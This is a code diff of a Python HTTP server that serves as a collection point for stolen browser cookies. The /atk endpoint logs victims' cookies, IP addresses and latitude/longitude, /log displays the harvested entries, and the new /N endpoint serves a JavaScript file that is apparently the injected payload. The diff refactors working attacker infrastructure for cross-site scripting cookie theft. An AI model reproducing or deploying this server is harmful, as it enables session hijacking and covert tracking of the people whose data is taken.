@@ -1,52 +1,26 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import urllib.parse
 import datetime
+import os
+
 i = 0
-# 定义一个处理请求的类
+
 class MyHTTPRequestHandler(BaseHTTPRequestHandler):
-
     log_file = "log.txt"
+    js_file_path = "a.js"  # Path to your a.js file
 
-    # 处理GET请求
     def do_GET(self):
         if self.path == '/':
             self.send_index()
         elif self.path.startswith('/log'):
             self.send_log()
         elif self.path.startswith('/atk'):
-            # 解析URL中的参数
-            parsed_path = urllib.parse.urlparse(self.path)
-            query_params = urllib.parse.parse_qs(parsed_path.query)
+            self.handle_atk_request()
+        elif self.path == '/N':
+            self.send_js_file()
+        else:
+            self.send_error(404, "File Not Found")
 
-            # 获取参数
-            if 'cookie' in query_params:
-                cookie_value = query_params['cookie'][0]
-                ip_address = self.client_address[0]  # 获取客户端IP地址
-                latitude = query_params.get('latitude', [''])[0]
-                longitude = query_params.get('longitude', [''])[0]
-
-                # 如果存在X-Forwarded-For头部，则使用该头部的值
-                x_forwarded_for = self.headers.get('X-Forwarded-For')
-                if x_forwarded_for:
-                    ip_address = x_forwarded_for.split(',')[0].strip()
-
-                # 记录日志
-                log_entry = f"{datetime.datetime.now()}\n Cookie: {cookie_value},\n IP: {ip_address},\n Latitude: {latitude},\n Longitude: {longitude}\n\n"
-                global i
-                i += 1
-                print()
-                print(
-                    f"[+]count {i}"
-                )
-                print(log_entry)
-                self.write_to_log(log_entry)
-
-            # 返回一个简单的响应
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b'Cookie Received')
-
-    # 发送首页
     def send_index(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
@@ -89,15 +63,12 @@ class MyHTTPRequestHandler(BaseHTTPRequestHandler):
         """
         self.wfile.write(html.encode('utf-8'))
 
-    # 发送日志页面
     def send_log(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
 
-        # 读取日志文件内容
         log_content = self.read_log()
-
         html = f"""
         <!DOCTYPE html>
         <html lang="en">
@@ -129,28 +100,62 @@ class MyHTTPRequestHandler(BaseHTTPRequestHandler):
         """
         self.wfile.write(html.encode('utf-8'))
 
-    # 读取日志文件
+    def handle_atk_request(self):
+        parsed_path = urllib.parse.urlparse(self.path)
+        query_params = urllib.parse.parse_qs(parsed_path.query)
+
+        if 'cookie' in query_params:
+            cookie_value = query_params['cookie'][0]
+            ip_address = self.client_address[0]
+            latitude = query_params.get('latitude', [''])[0]
+            longitude = query_params.get('longitude', [''])[0]
+
+            x_forwarded_for = self.headers.get('X-Forwarded-For')
+            if x_forwarded_for:
+                ip_address = x_forwarded_for.split(',')[0].strip()
+
+            log_entry = f"{datetime.datetime.now()}\n Cookie: {cookie_value},\n IP: {ip_address},\n Latitude: {latitude},\n Longitude: {longitude}\n\n"
+            global i
+            i += 1
+            print()
+            print(f"[+]count {i}")
+            print(log_entry)
+            self.write_to_log(log_entry)
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Cookie Received')
+
+    def send_js_file(self):
+        try:
+            with open(self.js_file_path, 'r') as js_file:
+                js_content = js_file.read()
+
+            self.send_response(200)
+            self.send_header('Content-type', 'application/javascript')
+            self.end_headers()
+            self.wfile.write(js_content.encode('utf-8'))
+        except FileNotFoundError:
+            self.send_error(404, "JS file not found")
+
     def read_log(self):
         try:
             with open(self.log_file, 'r') as log:
-                log_content = log.read().replace("\n","<br>")
+                log_content = log.read().replace("\n", "<br>")
             return log_content
         except FileNotFoundError:
             return "Log file not found."
 
-    # 写入日志文件
     def write_to_log(self, log_entry):
         with open(self.log_file, 'a') as log:
             log.write(log_entry)
 
-# 主程序入口
 def run(server_class=HTTPServer, handler_class=MyHTTPRequestHandler, port=8887):
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
     print(f'Starting httpd on http://127.0.0.1:{port}...')
     httpd.serve_forever()
 
-# 如果是直接运行该脚本，则启动服务器
 if __name__ == '__main__':
     run()
 
